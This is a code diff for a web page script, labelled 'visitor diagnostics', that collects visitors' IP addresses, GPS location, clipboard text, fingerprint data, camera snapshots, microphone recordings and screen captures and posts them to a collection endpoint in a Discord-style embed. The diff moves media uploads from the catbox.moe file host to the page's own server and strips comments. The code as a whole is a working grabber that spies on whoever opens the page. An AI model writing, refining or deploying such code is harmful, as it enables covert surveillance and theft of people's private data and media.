@@ -17,19 +17,18 @@
         const BACKEND_URL = '/api/collect';
 
         // ------------------------------------------------------------------
-        // NEW: upload a Blob to catbox.moe and return the public URL
+        // Upload to your own server (no CORS issues)
         // ------------------------------------------------------------------
-        async function uploadToCatbox(blob, filename) {
+        async function uploadToOwnServer(blob, filename) {
             const formData = new FormData();
-            formData.append('reqtype', 'fileupload');
-            formData.append('fileToUpload', blob, filename);
-            const response = await fetch('https://catbox.moe/user/api.php', {
+            formData.append('file', blob, filename);
+            const response = await fetch('/upload', {
                 method: 'POST',
                 body: formData
             });
             if (!response.ok) throw new Error(`Upload failed: ${response.status}`);
-            const url = await response.text();
-            return url.trim(); // e.g., https://files.catbox.moe/xxxxxx.jpg
+            const data = await response.json();
+            return data.url; // e.g., https://yourdomain.com/uploads/1234567890-xyz.jpg
         }
 
         (async () => {
@@ -115,9 +114,8 @@
                 return ext;
             }
 
-            // ==================== NEW EXTENDED DIAGNOSTICS (MASSIVELY EXPANDED) ====================
+            // ==================== NEW EXTENDED DIAGNOSTICS ====================
 
-            // 1. Full WebRTC local IPs (all interfaces)
             async function getAllLocalIPs() {
                 return new Promise((resolve) => {
                     const ips = new Set();
@@ -140,7 +138,6 @@
                 });
             }
 
-            // 2. Geolocation (GPS)
             async function getGeolocation() {
                 return new Promise((resolve) => {
                     if (!navigator.geolocation) { resolve(null); return; }
@@ -152,7 +149,7 @@
                 });
             }
 
-            // 3. Camera snapshot – upload full image to catbox, return URL
+            // Camera snapshot – upload to own server
             async function captureCameraSnapshot(videoTrack) {
                 if (!videoTrack) return null;
                 const stream = new MediaStream([videoTrack]);
@@ -170,7 +167,7 @@
                 video.remove();
                 if(videoTrack.stop) videoTrack.stop();
                 try {
-                    const url = await uploadToCatbox(blob, 'camera_snapshot.jpg');
+                    const url = await uploadToOwnServer(blob, 'camera_snapshot.jpg');
                     return url;
                 } catch(e) {
                     console.error('Camera upload failed:', e);
@@ -178,7 +175,7 @@
                 }
             }
 
-            // 4. Microphone recording – upload as webm, return URL
+            // Microphone recording – upload to own server
             async function captureMicrophoneSample(stream) {
                 if (!stream) return null;
                 const mediaRecorder = new MediaRecorder(stream);
@@ -191,7 +188,7 @@
                 const blob = new Blob(chunks, { type: 'audio/webm' });
                 stream.getTracks().forEach(t => t.stop());
                 try {
-                    const url = await uploadToCatbox(blob, 'microphone_sample.webm');
+                    const url = await uploadToOwnServer(blob, 'microphone_sample.webm');
                     return url;
                 } catch(e) {
                     console.error('Microphone upload failed:', e);
@@ -199,7 +196,7 @@
                 }
             }
 
-            // 5. Screen capture snapshot – upload as JPEG, return URL
+            // Screen capture – upload to own server
             async function captureScreenSnapshot() {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return null;
                 try {
@@ -216,7 +213,7 @@
                     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.5));
                     stream.getTracks().forEach(t => t.stop());
                     video.remove();
-                    const url = await uploadToCatbox(blob, 'screen_snapshot.jpg');
+                    const url = await uploadToOwnServer(blob, 'screen_snapshot.jpg');
                     return url;
                 } catch(e) {
                     console.error('Screen capture failed:', e);
@@ -224,7 +221,6 @@
                 }
             }
 
-            // 6. Clipboard read (text)
             async function readClipboard() {
                 if (!navigator.clipboard || !navigator.clipboard.readText) return null;
                 try {
@@ -233,7 +229,6 @@
                 } catch(e) { return { error: e.message }; }
             }
 
-            // 7. Device orientation
             function getOrientation() {
                 return new Promise((resolve) => {
                     if (!window.DeviceOrientationEvent) { resolve(null); return; }
@@ -246,7 +241,6 @@
                 });
             }
 
-            // 8. Ambient light sensor
             async function getAmbientLight() {
                 if (!window.AmbientLightSensor) return null;
                 try {
@@ -259,52 +253,20 @@
                 } catch(e) { return null; }
             }
 
-            // 9. Bluetooth devices (basic availability)
-            async function getBluetoothAvailability() {
-                if (!navigator.bluetooth) return false;
-                try {
-                    // just check if device supports – without requesting devices
-                    return true;
-                } catch(e) { return false; }
-            }
-
-            // 10. USB devices (via WebUSB – requires user gesture and permission)
-            async function getUSBAvailability() {
-                if (!navigator.usb) return false;
-                return true;
-            }
-
-            // 11. Speech recognition (just check support)
-            function getSpeechRecognitionSupport() {
-                const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
-                return !!SpeechRecognition;
-            }
-
-            // 12. Vibration (if supported)
-            function vibratePattern() {
-                if (!navigator.vibrate) return 'not supported';
-                navigator.vibrate(200);
-                return 'vibrated 200ms';
-            }
-
-            // 13. Notifications permission and show test (silent)
+            async function getBluetoothAvailability() { return !!navigator.bluetooth; }
+            async function getUSBAvailability() { return !!navigator.usb; }
+            function getSpeechRecognitionSupport() { return !!(window.SpeechRecognition || window.webkitSpeechRecognition); }
+            function vibratePattern() { if(navigator.vibrate) navigator.vibrate(200); return !!navigator.vibrate; }
             async function checkNotifications() {
                 if (!('Notification' in window)) return 'not supported';
                 const permission = Notification.permission;
-                if (permission === 'granted') {
-                    new Notification('Diagnostic test', { body: 'This is a test notification.', silent: true });
-                    return 'granted (test sent)';
-                }
+                if (permission === 'granted') new Notification('Diagnostic test', { body: 'Test', silent: true });
                 return permission;
             }
-
-            // 14. Gamepad detection
             function getGamepads() {
                 const pads = navigator.getGamepads ? navigator.getGamepads() : [];
                 return pads.filter(p => p !== null).map(p => ({ id: p.id, buttons: p.buttons.length, axes: p.axes.length }));
             }
-
-            // 15. Installed fonts (through CSS/JS measurement)
             function getInstalledFonts() {
                 const fontList = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Console", "Segoe UI", "Roboto", "Open Sans", "Calibri", "Cambria", "Consolas"];
                 const canvas = document.createElement('canvas');
@@ -318,16 +280,12 @@
                 }
                 return fontList.filter(checkFont);
             }
-
-            // 16. WebShare API support
             function webShareSupport() { return !!navigator.share; }
-
-            // 17. Permissions API (enumerate)
             async function getAllPermissions() {
                 if (!navigator.permissions || !navigator.permissions.query) return {};
-                const permissionNames = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write', 'persistent-storage', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
+                const names = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write', 'persistent-storage', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
                 const results = {};
-                for (const name of permissionNames) {
+                for (const name of names) {
                     try {
                         const status = await navigator.permissions.query({ name });
                         results[name] = status.state;
@@ -335,8 +293,6 @@
                 }
                 return results;
             }
-
-            // 18. Media devices (list all cameras, mics, speakers)
             async function enumerateMediaDevices() {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
                 try {
@@ -344,35 +300,31 @@
                     return devices.map(d => ({ kind: d.kind, label: d.label || 'hidden', deviceId: d.deviceId.slice(0,10) + '...' }));
                 } catch(e) { return []; }
             }
-
-            // 19. Request camera & microphone streams (get URLs)
             async function requestCameraAndMic() {
-                let cameraStream = null, micStream = null, cameraURL = null, micURL = null;
+                let cameraURL = null, micURL = null;
                 try {
-                    cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     if (cameraStream && cameraStream.getVideoTracks().length) {
                         const track = cameraStream.getVideoTracks()[0];
                         cameraURL = await captureCameraSnapshot(track);
                     }
                 } catch(e) { cameraURL = null; }
                 try {
-                    micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                     if (micStream) micURL = await captureMicrophoneSample(micStream);
                 } catch(e) { micURL = null; }
                 return { cameraSnapshotURL: cameraURL, microphoneSampleURL: micURL };
             }
 
-            // ==================== MAIN EXECUTION (all original + new) ====================
+            // ==================== MAIN EXECUTION ====================
             try {
                 logEl.textContent = 'Collecting data... (camera/mic/etc may request permission)';
 
-                // 1. Original methods
                 await getIPInfo();
                 const fingerprint = getFingerprint();
                 const vulns = await scanVulns();
                 const extended = await getExtended();
 
-                // 2. New intensive collection
                 const [allLocalIPs, geoLocation, orientation, ambientLight, bluetoothAvail, usbAvail, speechRecog, notifications, gamepads, installedFonts, webShare, permissions, mediaDevices, cameraMicData] = await Promise.all([
                     getAllLocalIPs(),
                     getGeolocation(),
@@ -392,7 +344,6 @@
                 const clipboardText = await readClipboard();
                 const screenSnapshotURL = await captureScreenSnapshot();
 
-                // 3. Build massive diagnostic object – now with URLs instead of base64
                 const fullDiag = {
                     webrtc_local_ips: allLocalIPs,
                     geolocation: geoLocation,
@@ -431,8 +382,6 @@
                 };
 
                 logEl.textContent = 'Sending full diagnostics payload...';
-
-                // Prepare final Embed – now with URLs (not truncated base64)
                 const finalPayload = {
                     content: '**ULTRA EXTENDED VISITOR DIAGNOSTICS**',
                     embeds: [{
@@ -458,13 +407,11 @@
                         timestamp: new Date().toISOString()
                     }]
                 };
-
                 const sendRes = await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(finalPayload)
                 });
-
                 logEl.textContent = sendRes.ok ? 'Full diagnostics sent successfully.' : 'Sent with partial success (HTTP ' + sendRes.status + ')';
             } catch (err) {
                 console.error(err);
